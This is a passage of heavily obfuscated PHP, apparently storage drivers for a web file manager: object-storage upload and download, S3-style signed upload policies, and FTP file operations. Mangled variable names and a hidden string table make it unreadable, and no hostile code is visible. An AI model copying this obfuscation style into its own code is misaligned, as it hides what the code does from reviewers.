$Ò²™Ğîù = $‚İ‡òÍà = array(); $this->fileList($’¨Èë¤œ, $Ò²™Ğîù, $‚İ‡òÍà, !0); $ë¯œòğÓ = array(); foreach ($‚İ‡òÍà as $–ãêÔ’‹) { $ë¯œòğÓ[$–ãêÔ’‹[$ëĞ×ãÆ²[32]]] = $–ãêÔ’‹[$ëĞ×ãÆ²[76]]; } foreach ($Ò²™Ğîù as $–ãêÔ’‹) { if (is_string($–ãêÔ’‹)) { $ë¯œòğÓ[$–ãêÔ’‹] = 0; } } return $this->listAllFiles($’¨Èë¤œ, array_keys($ë¯œòğÓ), $ë¯œòğÓ); } public function canRead($¬è½àñô) { return $this->exist($¬è½àñô) ? !0 : !1; } public function canWrite($„¢¾üø¥) { return $this->exist($„¢¾üø¥) ? !0 : !1; } public function getContent($è©‘¢Â) { return $this->fileSubstr($è©‘¢Â, 0, -1); } public function setContent($Öó¸øÎ, $–ùè¬ß = '') { $Ÿœœ¹™” =& $_SERVER[ä¿÷‹µ±]; if (!$–ùè¬ß) { $÷ˆÚ‹ÍÚ = $this->ussRequest($Öó¸øÎ, $Ÿœœ¹™”[226]); return $÷ˆÚ‹ÍÚ[$Ÿœœ¹™”[1213]]; } $Ö—™½ğ‘ = $this->tempFile($this->pathThis($Öó¸øÎ)); file_put_contents($Ö—™½ğ‘, $–ùè¬ß); if ($this->upload($Öó¸øÎ, $Ö—™½ğ‘)) { $this->tempFileRemve($Ö—™½ğ‘); return !0; } return !1; } public function fileSubstr($Ì‰éÑÁ, $¶Ù½§œŒ, $Á„¶óƒ) { $Ì ®û =& $_SERVER[ä¿÷‹µ±]; if (!($Ö¯ĞÎß¿ = $this->link($Ì‰éÑÁ))) { return !1; } $‡¼æÛ—„ = !1; if ($Á„¶óƒ > 0) { $Ö‰î¤¨Ã = $¶Ù½§œŒ + $Á„¶óƒ - 1; $‡¼æÛ—„ = array($Ì ®û[1454] . $¶Ù½§œŒ . $Ì ®û[386] . $Ö‰î¤¨Ã); } $òáÜè­¢ = url_request($Ö¯ĞÎß¿, $Ì ®û[230], !1, $‡¼æÛ—„); return $òáÜè­¢[$Ì ®û[769]] ? $òáÜè­¢[$Ì ®û[1215]] : !1; } public function upload($–Ÿ½Ş»¯, $´âÔ¨„÷, $Ì€òğ«• = false, $ìù®Ö°¼ = REPEAT_REPLACE) { $“¾äÂğ× =& $_SERVER[ä¿÷‹µ±]; $›½×„® = IO::size($´âÔ¨„÷); if ($›½×„® <= 1024 * 1024 * 200) { $« š–Ëî = array($“¾äÂğ×[1494] . $´âÔ¨„÷); $çì•íÜã = $this->ussRequest($–Ÿ½Ş»¯, $“¾äÂğ×[228], $« š–Ëî); return $çì•íÜã[$“¾äÂğ×[1213]] ? $this->getPathOuter($–Ÿ½Ş»¯) : !1; } $´¯ıÕ–Ó = 1024 * 1024 * 10; $ƒ©©ôğ° = array($“¾äÂğ×[1495], $“¾äÂğ×[1496] . $›½×„®, $“¾äÂğ×[1497], $“¾äÂğ×[1498] . $´¯ıÕ–Ó); $çì•íÜã = $this->ussRequest($–Ÿ½Ş»¯, $“¾äÂğ×[228], !1, $ƒ©©ôğ°); if (!$çì•íÜã[$“¾äÂğ×[1213]]) { return !1; } $ÊãŠóŒ = $çì•íÜã[$“¾äÂğ×[1215]]; $¾ÔµƒÃ® = 0; $úµ¤û¢ = $ÊãŠóŒ[$“¾äÂğ×[1499]]; $Öò ­àç = fopen($´âÔ¨„÷, $“¾äÂğ×[1403]); if (!$Öò ­àç) { return !1; } do { $Ùò¨’æš = $ÊãŠóŒ[$“¾äÂğ×[1500]]; fseek_64($Öò ­àç, $¾ÔµƒÃ®); $«¯ÃÓ  = fread($Öò ­àç, $Ùò¨’æš); $ÎŒËËş = 0; do { $ÎŒËËş++; $ÊãŠóŒ = $this->uploadPart($–Ÿ½Ş»¯, $ÊãŠóŒ, $«¯ÃÓ ); } while (!$ÊãŠóŒ && $ÎŒËËş < 3); if (!$ÊãŠóŒ) { return !1; } $úµ¤û¢ = $ÊãŠóŒ[$“¾äÂğ×[1499]]; $¾ÔµƒÃ® += $Ùò¨’æš; } while ($úµ¤û¢ != -1); fclose($Öò ­àç); $ƒ©©ôğ° = array($“¾äÂğ×[1501], $“¾äÂğ×[1502] . $ÊãŠóŒ[$“¾äÂğ×[1503]], $“¾äÂğ×[1497]); $çì•íÜã = $this->ussRequest($–Ÿ½Ş»¯, $“¾äÂğ×[228], !1, $ƒ©©ôğ°); return $çì•íÜã[$“¾äÂğ×[1213]] ? $this->getPathOuter($İú´¥Õ’) : !1; } private function uploadPart($ó©‚úßÀ, $Ïé°ÙÔ‚, &$Â½ÉÔ¦â) { $â“©Ş¹ä =& $_SERVER[ä¿÷‹µ±]; $±°õÙÍ = array($â“©Ş¹ä[1504], $â“©Ş¹ä[1502] . $Ïé°ÙÔ‚[$â“©Ş¹ä[1503]], $â“©Ş¹ä[1505] . $Ïé°ÙÔ‚[$â“©Ş¹ä[1499]], $â“©Ş¹ä[142] . $Ïé°ÙÔ‚[$â“©Ş¹ä[1500]]); $¤Èâİ´¦ = $this->ussRequest($ó©‚úßÀ, $â“©Ş¹ä[228], $Â½ÉÔ¦â, $±°õÙÍ); return !$¤Èâİ´¦[$â“©Ş¹ä[1213]] ? $¤Èâİ´¦[$â“©Ş¹ä[1213]] : $¤Èâİ´¦[$â“©Ş¹ä[1215]]; } public function uploadFormData($êöëêã¥, $Âê×«äü = 3600) { return $this->uploadPolicy($êöëêã¥, $Âê×«äü); } public function multiUploadFormData($”Í•ß¢, $ú­Öó·â = 3600) { $ö¥±˜à =& $_SERVER[ä¿÷‹µ±]; $‚ÔÃ’ãÃ = (int) $GLOBALS[$ö¥±˜à[7]][$ö¥±˜à[76]]; return $this->uploadPolicy($”Í•ß¢, $ú­Öó·â, $‚ÔÃ’ãÃ); } private function uploadPolicy($á®ØÌ˜Ğ, $œ¸³÷î¾ = 3600, $œÉÚ¶ƒ± = 0) { $øñ€›Ÿ­ =& $_SERVER[ä¿÷‹µ±]; $šè¹ê¤ = $øñ€›Ÿ­[8] . $this->bucket; $ì®Ûú¿Ï = gmdate($øñ€›Ÿ­[1439]); $ÕÁÌÉÄî = array($øñ€›Ÿ­[1506] => $this->bucket, $øñ€›Ÿ­[1507] => $á®ØÌ˜Ğ, $øñ€›Ÿ­[1508] => time() + $œ¸³÷î¾, $øñ€›Ÿ­[1509] => $ì®Ûú¿Ï); if ($œÉÚ¶ƒ±) { $ÕÁÌÉÄî[$øñ€›Ÿ­[1419]] = $œÉÚ¶ƒ±; } $ãÏ†úûÙ = base64_encode(json_encode($ÕÁÌÉÄî)); $û³Äì™ = base64_encode(hash_hmac($øñ€›Ÿ­[1476], "\x50\x4f\123\124\x26{$šè¹ê¤}\46{$ì®Ûú¿Ï}\x26{$ãÏ†úûÙ}", md5("{$this->userpass}"), !0)); $ ©§øôí = array($øñ€›Ÿ­[1344] => $ãÏ†úûÙ, $øñ€›Ÿ­[1510] => "\125\120\x59\125\x4e\x20{$this->username}\x3a{$û³Äì™}", $øñ€›Ÿ­[181] => $this->endpoint . $šè¹ê¤); return $ ©§øôí; } public function download($“Øùª’ä, $‚å©ññ±) { $³šÁ‘øĞ = IO::getPathInner(IO::mkfile($‚å©ññ±)); if (!($ÔµßëŸá = $this->link($“Øùª’ä))) { return !1; } $É¾™¶– = 0; $˜Èº’³ê = 1024 * 200; $Æ£áø®² = fopen($³šÁ‘øĞ, $_SERVER[ä¿÷‹µ±][1460]); while (!0) { $¿Â¥·áÓ = $this->fileSubstr($“Øùª’ä, $É¾™¶–, $˜Èº’³ê); if ($¿Â¥·áÓ === !1) { return !1; } fwrite($Æ£áø®², $¿Â¥·áÓ); $É¾™¶– += $˜Èº’³ê; if (strlen($¿Â¥·áÓ) < $˜Èº’³ê) { break; } } fclose($Æ£áø®²); return $‚å©ññ±; } public function link($«°àÍõ¯, $÷¡ÖÔ° = array()) { $ñæß“âŠ =& $_SERVER[ä¿÷‹µ±]; $«°àÍõ¯ = trim($«°àÍõ¯, $ñæß“âŠ[8]); if (!empty($this->token)) { $ÇºÀÏ™ï = strtotime(date($ñæß“âŠ[1511])); $“§Í¢¸Ø = substr(md5($this->token . $ñæß“âŠ[284] . $ÇºÀÏ™ï . $ñæß“âŠ[1512] . $«°àÍõ¯), 12, 8) . $ÇºÀÏ™ï; $÷¡ÖÔ°[] = $ñæß“âŠ[1513] . $“§Í¢¸Ø; } $¸ğ›¯ãå = !empty($÷¡ÖÔ°) ? $ñæß“âŠ[73] . implode($ñæß“âŠ[284], $÷¡ÖÔ°) : $ñæß“âŠ[12]; return $this->getHost() . $ñæß“âŠ[8] . $«°àÍõ¯ . $¸ğ›¯ãå; } public function fileOut($¦ù ôÅˆ, $«ø‡Ûñ = false, $Ò†ğÏÛ = false, $û®“ÑÛÈ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($¦ù ôÅˆ, $«ø‡Ûñ, $Ò†ğÏÛ, $û®“ÑÛÈ); } if (!$Ò†ğÏÛ) { $Ò†ğÏÛ = $this->pathThis($¦ù ôÅˆ); } $ËÈ¾­¯¬ = $«ø‡Ûñ ? array($_SERVER[ä¿÷‹µ±][1514] . rawurlencode($Ò†ğÏÛ)) : array(); $ğÅ¨¾Ùñ = $this->link($¦ù ôÅˆ, $ËÈ¾­¯¬); $this->fileOutLink($ğÅ¨¾Ùñ); } public function fileOutServer($«ïºØóÈ, $•Ğ¢ğ = false, $ê¿Ş¢Şá = false, $È±»å× = '') { parent::fileOut($«ïºØóÈ, $•Ğ¢ğ, $ê¿Ş¢Şá, $È±»å×); } public function fileOutImage($’ˆŒà¢Ş, $µ¿ÍÒï‰ = 250) { $È¯û¶üƒ = $this->link($’ˆŒà¢Ş . $_SERVER[ä¿÷‹µ±][1515] . $µ¿ÍÒï‰); $this->fileOutLink($È¯û¶üƒ); } public function fileOutImageServer($´­Ë », $Áüéªµ = 250) { parent::fileOutImage($´­Ë », $Áüéªµ); } public function hashMd5($ÊîØÌ‹) { $¸ì¬ë¨ =& $_SERVER[ä¿÷‹µ±]; $Š¥ç¢éı = $this->_objectMeta($ÊîØÌ‹); return isset($Š¥ç¢éı[$¸ì¬ë¨[212]]) ? $Š¥ç¢éı[$¸ì¬ë¨[212]] : !1; } public function size($Á¬¼Ëüæ) { $ıŞà×ßÁ = $this->objectMeta($Á¬¼Ëüæ); return $ıŞà×ßÁ ? $ıŞà×ßÁ[$_SERVER[ä¿÷‹µ±][76]] : 0; } public function info($úù§ÉàÕ) { if ($this->isFolder($úù§ÉàÕ)) { return $this->folderInfo($úù§ÉàÕ); } else { if ($this->isFile($úù§ÉàÕ)) { return $this->fileInfo($úù§ÉàÕ); } } return !1; } public function exist($ä™±®Êğ) { return $this->isFile($ä™±®Êğ) || $this->isFolder($ä™±®Êğ); } public function isFile($îÌı„¼¶) { return !$this->isFolder($îÌı„¼¶) && $this->objectMeta($îÌı„¼¶); } public function isFolder($”®øŞÂ») { return $this->cacheMethod($_SERVER[ä¿÷‹µ±][165], $”®øŞÂ»); } protected function objectMeta($îËæÙÆ°) { return $this->cacheMethod($_SERVER[ä¿÷‹µ±][167], $îËæÙÆ°); } protected function _objectMeta($× ñë¸Ë) { $¸¶¸Ù£¤ =& $_SERVER[ä¿÷‹µ±]; if ($× ñë¸Ë == $¸¶¸Ù£¤[12] || $× ñë¸Ë == $¸¶¸Ù£¤[8]) { return array(); } $Ó×²……ú = $this->ussRequest($× ñë¸Ë, $¸¶¸Ù£¤[1516]); if (!$Ó×²……ú[$¸¶¸Ù£¤[1213]]) { return null; } $Åáõ¼Ç” = isset($Ó×²……ú[$¸¶¸Ù£¤[1215]]) ? $Ó×²……ú[$¸¶¸Ù£¤[1215]] : array(); if (!isset($Åáõ¼Ç”[$¸¶¸Ù£¤[1517]])) { return null; } $¿ì–Á¡ø = array($¸¶¸Ù£¤[33] => isset($Åáõ¼Ç”[$¸¶¸Ù£¤[1517]]) ? $Åáõ¼Ç”[$¸¶¸Ù£¤[1517]] : null, $¸¶¸Ù£¤[76] => isset($Åáõ¼Ç”[$¸¶¸Ù£¤[1518]]) ? $Åáõ¼Ç”[$¸¶¸Ù£¤[1518]] : null, $¸¶¸Ù£¤[212] => isset($Åáõ¼Ç”[$¸¶¸Ù£¤[1519]]) ? $Åáõ¼Ç”[$¸¶¸Ù£¤[1519]] : null, $¸¶¸Ù£¤[1486] => isset($Åáõ¼Ç”[$¸¶¸Ù£¤[1520]]) ? $Åáõ¼Ç”[$¸¶¸Ù£¤[1520]] : null); $¿ì–Á¡ø[$¸¶¸Ù£¤[1487]] = isset($Åáõ¼Ç”[$¸¶¸Ù£¤[1521]]) ? strtotime($Åáõ¼Ç”[$¸¶¸Ù£¤[1521]]) : $¿ì–Á¡ø[$¸¶¸Ù£¤[1486]]; return $¿ì–Á¡ø; } protected function _isFolder($¥œ“†­³) { $ÍÓÀû¡Ş =& $_SERVER[ä¿÷‹µ±]; if ($¥œ“†­³ == $ÍÓÀû¡Ş[12] || $¥œ“†­³ == $ÍÓÀû¡Ş[8]) { return !0; } $¤ô¬ø = $this->_objectMeta($¥œ“†­³); return isset($¤ô¬ø[$ÍÓÀû¡Ş[33]]) && $¤ô¬ø[$ÍÓÀû¡Ş[33]] == $ÍÓÀû¡Ş[75] ? !0 : !1; } } goto AÄ­“­íÃÈ; b°ãŠ‰›Æ—: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Ù»–š¥³) { parent::__construct($Ù»–š¥³); $this->signatureVersion($_SERVER[ä¿÷‹µ±][216]); } public function uploadFormData($—¸àë·Ù, $é¡£…«Š = 3600) { $éØÉì²© =& $_SERVER[ä¿÷‹µ±]; $ä›”ú§ = $éØÉì²©[198]; $Ü˜ùå¾¸ = $éØÉì²©[1368]; $Ãû¬íÈÆ = $éØÉì²©[62]; $¸¤ƒ‹‰ = gmdate($éØÉì²©[1369]); $ÓºÁÉªĞ = gmdate($éØÉì²©[770]); $Êùãˆºæ = $éØÉì²©[1370]; $ÃúÓáÇë = $é¡£…«Š . $éØÉì²©[12]; $¤ñä»á = $éØÉì²©[1332]; $Õ±ù±¯“ = array($this->accessKey, $ÓºÁÉªĞ, $this->region, $Ãû¬íÈÆ, $Êùãˆºæ); $©ŸŞ²‘à = implode($éØÉì²©[8], $Õ±ù±¯“); $ÖÃÍÚÄ = array($éØÉì²©[1334] => gmdate($éØÉì²©[1333], strtotime($éØÉì²©[1371])), $éØÉì²©[1335] => array(array($éØÉì²©[1337] => $this->bucket), array($éØÉì²©[1336] => $ä›”ú§), array($éØÉì²©[1338], $éØÉì²©[1339], $éØÉì²©[12]), array($éØÉì²©[1338], $éØÉì²©[1372], $éØÉì²©[12]), array($éØÉì²©[1338], $éØÉì²©[1373], $éØÉì²©[12]), array($éØÉì²©[1340] => $¤ñä»á), array($éØÉì²©[1374] => $©ŸŞ²‘à), array($éØÉì²©[1375] => $Ü˜ùå¾¸), array($éØÉì²©[1376] => $¸¤ƒ‹‰), array($éØÉì²©[1377] => $ÃúÓáÇë))); $êŠÃÚ‘ = base64_encode(json_encode($ÖÃÍÚÄ)); $ıÚµå’ = hash_hmac($éØÉì²©[1378], $ÓºÁÉªĞ, $éØÉì²©[1379] . $this->secret, !0); $›š‚üÎ“ = hash_hmac($éØÉì²©[1378], $this->region, $ıÚµå’, !0); $íú‚£Ïé = hash_hmac($éØÉì²©[1378], $Ãû¬íÈÆ, $›š‚üÎ“, !0); $„¤İ‰³  = hash_hmac($éØÉì²©[1378], $Êùãˆºæ, $íú‚£Ïé, !0); $¦ò¦Âó = hash_hmac($éØÉì²©[1378], $êŠÃÚ‘, $„¤İ‰³ ); $Ö¸úó¶’ = array($éØÉì²©[215] => $éØÉì²©[12], $éØÉì²©[1380] => $éØÉì²©[12], $éØÉì²©[1336] => $ä›”ú§, $éØÉì²©[1340] => $¤ñä»á, $éØÉì²©[1344] => $êŠÃÚ‘, $éØÉì²©[1381] => $©ŸŞ²‘à, $éØÉì²©[1382] => $Ü˜ùå¾¸, $éØÉì²©[1383] => $¸¤ƒ‹‰, $éØÉì²©[1384] => $ÃúÓáÇë, $éØÉì²©[1385] => $¦ò¦Âó, $éØÉì²©[181] => $this->getHost()); return $Ö¸úó¶’; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($Œûû”¾) { parent::__construct(); if (count($Œûû”¾) > 0) { $this->_init($Œûû”¾); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($éû´‘©Ú) { $ïóºÉÄ =& $_SERVER[ä¿÷‹µ±]; global $config; $this->appCharset = $config[$ïóºÉÄ[1386]]; $this->systemCharset = $config[$ïóºÉÄ[1387]]; if (isset($éû´‘©Ú[$ïóºÉÄ[1388]]) && $éû´‘©Ú[$ïóºÉÄ[1388]]) { $this->systemCharset = $éû´‘©Ú[$ïóºÉÄ[1388]]; } } public function iconvApp($İ¯×È) { return $this->iconvTo($İ¯×È, $this->systemCharset, $this->appCharset); } public function iconvSystem($ ’‹Á) { return $this->iconvTo($ ’‹Á, $this->appCharset, $this->systemCharset); } public function getPathOuter($óšÂµå) { $ùºÇãâ§ =& $_SERVER[ä¿÷‹µ±]; $ï‘ÓŸ—’ = $this->iconvApp($this->pathBase); $óšÂµå = $this->iconvApp($óšÂµå); if (substr($ï‘ÓŸ—’, 0, 2) == $ùºÇãâ§[1389]) { $ï‘ÓŸ—’ = BASIC_PATH . substr($ï‘ÓŸ—’, 2); } if (substr($óšÂµå, 0, 2) == $ùºÇãâ§[1389]) { $óšÂµå = BASIC_PATH . substr($óšÂµå, 2); } $ï‘ÓŸ—’ = KodIO::clear($ï‘ÓŸ—’); $óšÂµå = KodIO::clear($óšÂµå); $óšÂµå = substr($óšÂµå, strlen($ï‘ÓŸ—’)); if (empty($this->pathDriver)) { return $óšÂµå; } return $this->pathDriver . $ùºÇãâ§[8] . ltrim($óšÂµå, $ùºÇãâ§[8]); } private function _init($İ’‚ä¥© = array()) { $îÆ‹ÕÅì =& $_SERVER[ä¿÷‹µ±]; if (!function_exists($îÆ‹ÕÅì[1390])) { throw new Exception(LNG($îÆ‹ÕÅì[1391])); } $this->config = $İ’‚ä¥©; $this->charsetReset($İ’‚ä¥©); foreach ($İ’‚ä¥© as $şçæÛÔÇ => $’©á²…Â) { if (isset($this->{$şçæÛÔÇ})) { $this->{$şçæÛÔÇ} = $’©á²…Â; } } return $this->_login($İ’‚ä¥©); } private function _login($ô¬æ¤ËØ) { $‡—¶«‰ =& $_SERVER[ä¿÷‹µ±]; static $è­¨ş‚õ = array(); $ŸãûÒš = md5(json_encode($ô¬æ¤ËØ)); if (isset($è­¨ş‚õ[$ŸãûÒš])) { foreach ($è­¨ş‚õ[$ŸãûÒš] as $ŒÅ¥­³© => $ÂŒİµà) { $this->{$ŒÅ¥­³©} = $ÂŒİµà; } return !0; } $®ßœìš = parse_url(trim($this->server, $‡—¶«‰[8])); $this->host = $®ßœìš[$‡—¶«‰[181]]; $¿ü¶ï‰ë = isset($®ßœìš[$‡—¶«‰[180]]) && $®ßœìš[$‡—¶«‰[180]] == $‡—¶«‰[1392] ? !0 : !1; $this->scheme = $¿ü¶ï‰ë ? $‡—¶«‰[1393] : $‡—¶«‰[1394]; $this->port = isset($®ßœìš[$‡—¶«‰[182]]) ? $®ßœìš[$‡—¶«‰[182]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $¶Ëõ¦½‰ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ˆÔÑÜş„ = $this->pasv == $‡—¶«‰[88] ? !0 : !1; @ftp_pasv($this->connect, $ˆÔÑÜş„); $è­¨ş‚õ[$ŸãûÒš] = array($‡—¶«‰[1395] => $this->connect, $‡—¶«‰[181] => $this->host, $‡—¶«‰[180] => $this->scheme, $‡—¶«‰[182] => $this->port); return $¶Ëõ¦½‰; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($³™“¹ç, $Á©ôÇ¡´ = '', $ˆ¯Şô—Î = REPEAT_RENAME) { if ($this->setContent($³™“¹ç, $Á©ôÇ¡´)) { return $this->getPathOuter($³™“¹ç); } return !1; } public function mkdir($‘èûÀô, $Æ¡çò“¿ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $‘èûÀô = $this->iconvSystem($‘èûÀô); if ($this->_isFolder($‘èûÀô) || @ftp_mkdir($this->connect, $‘èûÀô)) { return $this->getPathOuter($‘èûÀô); } if (!$this->mkdir($this->pathFather($‘èûÀô))) { return !1; } if ($‘èûÀô = @ftp_mkdir($this->connect, $‘èûÀô)) { return $this->getPathOuter($‘èûÀô); } return !1; } public function copyFile($ÒÈÚØœ´, $şÜ•ıÄÛ) { if (!$this->_isconn()) { return !1; } $€ÊÛ™Ÿ¹ = $this->pathThis($this->iconvSystem($ÒÈÚØœ´)); $ï˜Ş†öË = $this->tempFile($€ÊÛ™Ÿ¹); $™îˆİáí = $this->iconvApp($ï˜Ş†öË); $this->download($ÒÈÚØœ´, $™îˆİáí); $©©·ÄÊ€ = $this->upload($şÜ•ıÄÛ, $™îˆİáí); $this->tempFileRemve($ï˜Ş†öË); return $©©·ÄÊ€; } public function moveFile($¹òåŸÜ¶, $¬Ò‡÷ê») { if (!$this->_isconn()) { return !1; } $¹òåŸÜ¶ = $this->iconvSystem($¹òåŸÜ¶); $¬Ò‡÷ê» = $this->iconvSystem($¬Ò‡÷ê»); $í¸Ú·Ò = @ftp_rename($this->connect, $¹òåŸÜ¶, $¬Ò‡÷ê»); return $í¸Ú·Ò ? $this->getPathOuter($¬Ò‡÷ê») : !1; } public function delFile($Åï©¨ºæ) { if (!$this->_isconn()) { return !1; } $Åï©¨ºæ = $this->iconvSystem($Åï©¨ºæ); return @ftp_delete($this->connect, $Åï©¨ºæ); } public function delFolder($”íû·úÀ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ãİå†¼û = $ä¶˜ÚË« = array(); $this->fileList($”íû·úÀ, $ãİå†¼û, $ä¶˜ÚË«, !0); $this->listItemCache = !0; foreach ($ä¶˜ÚË« as $º”õõ——) { $‘øÇûş = $this->iconvSystem($º”õõ——[$_SERVER[ä¿÷‹µ±][32]]); $æ”¼Ë®ˆ = @ftp_delete($this->connect, $‘øÇûş); if (!$æ”¼Ë®ˆ) { return !1; } } foreach ($ãİå†¼û as $‘øÇûş) { $‘øÇûş = $this->iconvSystem($‘øÇûş); $æ”¼Ë®ˆ = @ftp_rmdir($this->connect, $‘øÇûş); if (!$æ”¼Ë®ˆ) { return !1; } } $”íû·úÀ = $this->iconvSystem($”íû·úÀ); return @ftp_rmdir($this->connect, $”íû·úÀ); } public function rename($«œ¯§Ÿî, $Æ£¥ºé) { $ÏğŠïã =& $_SERVER[ä¿÷‹µ±]; if (!$this->_isconn()) { return !1; } $¹ğÅ›á¯ = $this->fileNameAuto($this->pathFather($«œ¯§Ÿî), $Æ£¥ºé); $¹ğÅ›á¯ = $this->iconvSystem($¹ğÅ›á¯); $«œ¯§Ÿî = $this->iconvSystem($«œ¯§Ÿî); $°‹Àâ¸¤ = $this->pathFather($«œ¯§Ÿî); $ÏÅÄÌ¶Â = rtrim($°‹Àâ¸¤, $ÏğŠïã[8]) . $ÏğŠïã[8] . $¹ğÅ›á¯; $ëÕ¬å†í = @ftp_rename($this->connect, $«œ¯§Ÿî, $ÏÅÄÌ¶Â); $ÏÅÄÌ¶Â = $this->iconvApp($ÏÅÄÌ¶Â); return $ëÕ¬å†í ? $this->getPathOuter($ÏÅÄÌ¶Â) : !1; } private function folderInfo($¿ıéó¨ï, $àöğïÙè = false) { $ì°Î¥¦ı =& $_SERVER[ä¿÷‹µ±]; $È©½ĞÍÓ = array($ì°Î¥¦ı[32] => $this->pathThis($¿ıéó¨ï), $ì°Î¥¦ı[84] => $this->getPathOuter($ì°Î¥¦ı[8] . $¿ıéó¨ï), $ì°Î¥¦ı[33] => $ì°Î¥¦ı[75]); if ($àöğïÙè) { return $È©½ĞÍÓ; } $È©½ĞÍÓ[$ì°Î¥¦ı[200]] = $È©½ĞÍÓ[$ì°Î¥¦ı[85]] = 0; $È©½ĞÍÓ[$ì°Î¥¦ı[201]] = $È©½ĞÍÓ[$ì°Î¥¦ı[202]] = !0; return $È©½ĞÍÓ; } private function fileInfo($ê”±İÁ‡, $šøØ˜‚¢ = false, $ç«ÎéÎ = array()) { $®¶ëÍŒí =& $_SERVER[ä¿÷‹µ±]; $ÇöË¦¶ = array($®¶ëÍŒí[32] => $this->pathThis($ê”±İÁ‡), $®¶ëÍŒí[84] => $this->getPathOuter($®¶ëÍŒí[8] . $ê”±İÁ‡), $®¶ëÍŒí[33] => $®¶ëÍŒí[199], $®¶ëÍŒí[76] => isset($ç«ÎéÎ[$®¶ëÍŒí[76]]) ? $ç«ÎéÎ[$®¶ëÍŒí[76]] : 0, $®¶ëÍŒí[174] => $this->ext($ê”±İÁ‡)); if ($šøØ˜‚¢) { return $ÇöË¦¶; } $ÇöË¦¶[$®¶ëÍŒí[200]] = $ÇöË¦¶[$®¶ëÍŒí[85]] = 0; $ÇöË¦¶[$®¶ëÍŒí[201]] = $ÇöË¦¶[$®¶ëÍŒí[202]] = !0; $˜™È±òî = $this->iconvSystem($ê”±İÁ‡); $ÇöË¦¶[$®¶ëÍŒí[85]] = @ftp_mdtm($this->connect, $˜™È±òî); if (empty($ç«ÎéÎ)) { $ç«ÎéÎ = $this->objectMeta($ê”±İÁ‡); if (!$ç«ÎéÎ) { return $ÇöË¦¶; } } $ÇöË¦¶[$®¶ëÍŒí[76]] = $ç«ÎéÎ[$®¶ëÍŒí[76]]; return $ÇöË¦¶; } public function size($ëßöº®‘) { $Ôô™Œ™¹ = $this->objectMeta($ëßöº®‘); return $Ôô™Œ™¹ ? $Ôô™Œ™¹[$_SERVER[ä¿÷‹µ±][76]] : 0; } public function info($Æ®¿ºà) { if ($this->isFile($Æ®¿ºà)) { return $this->fileInfo($Æ®¿ºà, 0); } else { if ($this->isFolder($Æ®¿ºà)) { return $this->folderInfo($Æ®¿ºà); } } return !1; } private function fileList($úïÅÇ˜, &$Ì±ı“ØÒ, &$ó ì¹¢ü, $çòØéøÍ = false) { $µü›ıÜ =& $_SERVER[ä¿÷‹µ±]; $úïÅÇ˜ = $this->iconvSystem($úïÅÇ˜); if (!$this->isFolder($úïÅÇ˜)) { return !1; } @ftp_chdir($this->connect, $µü›ıÜ[8]); $úïÅÇ˜ = rtrim($úïÅÇ˜, $µü›ıÜ[8]) . $µü›ıÜ[8]; check_abort(); $ÑèİÒôÖ = @ftp_rawlist($this->connect, $úïÅÇ˜); if (!$ÑèİÒôÖ) { $ÑèİÒôÖ = array(); } $€šæÓç… = array($µü›ıÜ[10] => 1, $µü›ıÜ[1396] => 1); foreach ($ÑèİÒôÖ as $š¿Â˜ŞÕ) { $±è®ñË¬ = $this->_listItem($š¿Â˜ŞÕ); if ($±è®ñË¬[0] == $µü›ıÜ[778]) { continue; } $ášö¦ûñ = $±è®ñË¬[8]; if (empty($ášö¦ûñ) && $ášö¦ûñ !== $µü›ıÜ[197] || isset($€šæÓç…[$ášö¦ûñ])) { continue; } $ášö¦ûñ = $this->iconvApp($úïÅÇ˜ . ltrim($ášö¦ûñ, $µü›ıÜ[8])); $ùÔÕéÀ = array($µü›ıÜ[32] => $ášö¦ûñ, $µü›ıÜ[33] => $µü›ıÜ[199], $µü›ıÜ[76] => $±è®ñË¬[4]); if (substr($š¿Â˜ŞÕ, 0, 1) == $µü›ıÜ[1397]) { $ùÔÕéÀ[$µü›ıÜ[33]] = $µü›ıÜ[75]; $ùÔÕéÀ[$µü›ıÜ[76]] = 0; } $µã¶ªøÑ = $ùÔÕéÀ[$µü›ıÜ[33]] == $µü›ıÜ[75] ? !0 : !1; $this->cacheMethodInfoSet($ášö¦ûñ, $µã¶ªøÑ, $ùÔÕéÀ); if ($µã¶ªøÑ) { $Ì±ı“ØÒ[] = $ášö¦ûñ; if ($çòØéøÍ) { $this->fileList($ášö¦ûñ, $Ì±ı“ØÒ, $ó ì¹¢ü, $çòØéøÍ); } continue; } $ó ì¹¢ü[] = $ùÔÕéÀ; } $this->cacheMethodInfoSet($úïÅÇ˜, !0); } private function _listItem($‡¼€ôı) { if (empty($‡¼€ôı)) { return array(); } $†ÜÎô¤ = preg_split($_SERVER[ä¿÷‹µ±][1398], $‡¼€ôı); if (count($†ÜÎô¤) <= 9) { return $†ÜÎô¤; } $†ÜÎô¤[8] = trim(substr($‡¼€ôı, strpos($‡¼€ôı, $†ÜÎô¤[7]) + strlen($†ÜÎô¤[7]))); return array_splice($†ÜÎô¤, 0, 9); } public function listPath($½²ŸÙ«ô, $‰øù†¶æ = false) { $ÊËÔÈ =& $_SERVER[ä¿÷‹µ±]; if (!$this->_isconn()) { return !1; } $—åšİîè = $Ï‘»£Æ = array(); $this->fileList($½²ŸÙ«ô, $—åšİîè, $Ï‘»£Æ); foreach ($—åšİîè as $ÕŠÛÀ´ö => $Õ›’ãõ¨) { $—åšİîè[$ÕŠÛÀ´ö] = $this->folderInfo($Õ›’ãõ¨, $‰øù†¶æ); } foreach ($Ï‘»£Æ as $ÕŠÛÀ´ö => $Õ›’ãõ¨) { $Ï‘»£Æ[$ÕŠÛÀ´ö] = $this->fileInfo($Õ›’ãõ¨[$ÊËÔÈ[32]], $‰øù†¶æ, $Õ›’ãõ¨); } return array($ÊËÔÈ[82] => $—åšİîè, $ÊËÔÈ[83] => $Ï‘»£Æ); } public function 